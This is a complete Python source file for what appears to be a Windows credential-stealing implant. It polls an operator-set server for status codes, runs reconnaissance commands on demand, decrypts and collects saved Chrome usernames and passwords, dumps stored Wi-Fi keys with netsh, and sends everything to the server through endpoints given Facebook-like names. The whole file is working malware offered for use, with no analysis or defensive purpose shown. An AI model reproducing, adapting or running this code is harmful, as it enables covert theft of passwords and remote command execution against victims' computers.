#!/usr/bin/env python3

#Imports
import os
import subprocess
import requests
import time
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import datetime
import ctypes
import pyautogui
from threading import Thread
import win32gui

CollectedData = ""
webUrl = "" #e.g: "http://127.0.0.1:5000" without an ending slash!

#statuscode: 99
def postData():
    url = webUrl + '/facebook'
    raw_data = CollectedData
    requests.post(url, data=raw_data, headers={'Content-Type': 'application/x-www-form-urlencoded'})


def postChangeStatusCodeTo98():
    url = webUrl + '/FacebookAddStatusFriend'
    raw_data = str(98)
    requests.post(url, data=raw_data, headers={'Content-Type': 'application/x-www-form-urlencoded'})


def SEND_ERROR(error):
    url = webUrl + '/facebook'
    raw_data = error
    requests.post(url, data=error, headers={'Content-Type': 'application/x-www-form-urlencoded'})


def getStatusCode():
    url = webUrl + '/facebookfriends'
    response = requests.get(url, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    bytes = response.content
    statuscode = bytes.decode("utf-8")
    return int(statuscode)


#= actually a msdos command
def linuxCommand(command):
    try:
        global CollectedData
        now = datetime.datetime.now()
        CollectedData += "\n[]   --- START COMMAND '" + str(command) + "' ---   []\n"
        CollectedData += "CURRENT TIME: " + now.strftime("%Y-%m-%d %H:%M:%S") + "\n"
        CollectedData += subprocess.getoutput(command)
        CollectedData += "\n[]   --- END   COMMAND '" + str(command) + "' ---   []\n"
        postChangeStatusCodeTo98()
    except:
        error = "COMMAND: " + command + " FAILED!"
        SEND_ERROR(error)


def stealChromePasswords():
    try:
        global CollectedData
        CollectedData += "\n[]   --- START STEALING CHROME CREDENTIALS ---   []\n"

        def get_encryption_key():
            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "Google", "Chrome",
                                            "User Data", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            # decode the encryption key from Base64
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

            key = key[5:] # remove DPAPI str
            # return decrypted key that was originally encrypted
            # using a session key derived from current user's logon credentials
            # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

        def decrypt_password(password, key):
            try:
                # get the initialization vector
                iv = password[3:15]
                password = password[15:]
                # generate cipher
                cipher = AES.new(key, AES.MODE_GCM, iv)
                # decrypt password
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    # not supported
                    return ""
        
        # get the AES key
        key = get_encryption_key()
        # local sqlite Chrome database path
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "default", "Login Data")
        # copy the file to another location
        # as the database will be locked if chrome is currently running
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        # connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        # `logins` table has the data we need
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        # iterate over all rows
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                CollectedData += ("\n")
                CollectedData += (f"Origin URL: {origin_url}")
                CollectedData += ("\n")
                CollectedData += (f"Action URL: {action_url}")
                CollectedData += ("\n")
                CollectedData += (f"Username: {username}")
                CollectedData += ("\n")
                CollectedData += (f"Password: {password}")
                CollectedData += ("\n")
                CollectedData += (" -------------------------------------------------- ")
        cursor.close()
        db.close()
        time.sleep(1)
        try:
            # try to remove the copied db file
            os.remove(filename)
        except:
            pass

        CollectedData += "\n[]   --- STOP STEALING CHROME CREDENTIALS  ---   []\n"
        postChangeStatusCodeTo98()
    except:
        error = "Chrome steal failed"
        SEND_ERROR(error)


def getAllWifiPasswords():
    global CollectedData
    CollectedData += "\n[]   --- START STEALING WIFI PASSWORDS ---   []\n"
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            CollectedData += ("\n")
            CollectedData += "{:<30}|  {:<}".format(i, results[0])
        except IndexError:
            CollectedData += ("\n")
            CollectedData += "{:<30}|  {:<}".format(i, "")
    CollectedData += "\n[]   --- STOP STEALING WIFI PASSWORDS  ---   []\n"
    postChangeStatusCodeTo98()


def show_public_ip():
    try:
        global CollectedData
        now = datetime.datetime.now()
        CollectedData += "\n[]   --- START COLLECTING PUBLIC IP: ---   []\n"
        CollectedData += "CURRENT TIME: " + now.strftime("%Y-%m-%d %H:%M:%S") + "\n"
        publicip = requests.get('https://api.ipify.org').text
        CollectedData += publicip
        CollectedData += "\n[]   --- STOP  COLLECTING PUBLIC IP: ---   []\n"
        postChangeStatusCodeTo98()
    except:
        error = "COLLECTING PUBLIC IP FAILED!"
        SEND_ERROR(error)


while True:
    try:
        statuscode = getStatusCode()

        #Add new Instructions here:
        # - Statuscode: 99 Saves all data to the server

        if statuscode == 0:
            linuxCommand('dir')
        elif statuscode == 1:
            linuxCommand('whoami')
        elif statuscode == 2:
            linuxCommand('ipconfig')
        elif statuscode == 3:
            linuxCommand('arp -a')
        elif statuscode == 4:
            stealChromePasswords()
        elif statuscode == 5:
            linuxCommand('netsh wlan show profile')
        elif statuscode == 6:
            getAllWifiPasswords()
        elif statuscode == 9:
            show_public_ip()
        elif statuscode == 98:
            while True:
                time.sleep(3)
                checkforothercodethan98 = getStatusCode()
                if checkforothercodethan98 != 98:
                    break
        elif statuscode == 99: #POST DATA
            postData()
            postChangeStatusCodeTo98()
            CollectedData = ""
        else:
            now = datetime.datetime.now()
            error = "STATUSCODE DOES NOT EXIST - TIME: " + now.strftime("%Y-%m-%d %H:%M:%S")
            SEND_ERROR(error)
        
        time.sleep(3)
    except:
        now = datetime.datetime.now()
        error = "UNABLE TO REQUEST STATUSCODE - TIME: " + now.strftime("%Y-%m-%d %H:%M:%S")
        SEND_ERROR(error)